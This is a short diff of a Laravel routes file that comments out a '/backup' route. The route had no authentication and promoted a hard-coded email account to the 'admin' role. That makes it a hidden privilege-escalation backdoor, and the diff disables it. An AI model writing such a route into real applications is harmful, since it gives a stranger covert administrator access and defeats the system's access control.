@@ -104,8 +104,8 @@ Route::get('/', [HomeController::class, 'index']);
 Route::get('/a', [HomeController::class, 'indexs']);
 Route::get('/download', [ExportExcelController::class, 'Export']);
 
-Route::get('/backup', function () {
-    User::where('email', 'sihdobleh@gmail.com')->update([
-        'role' => 'admin'
-    ]);
-});
+// Route::get('/backup', function () {
+//     User::where('email', 'sihdobleh@gmail.com')->update([
+//         'role' => 'admin'
+//     ]);
+// });
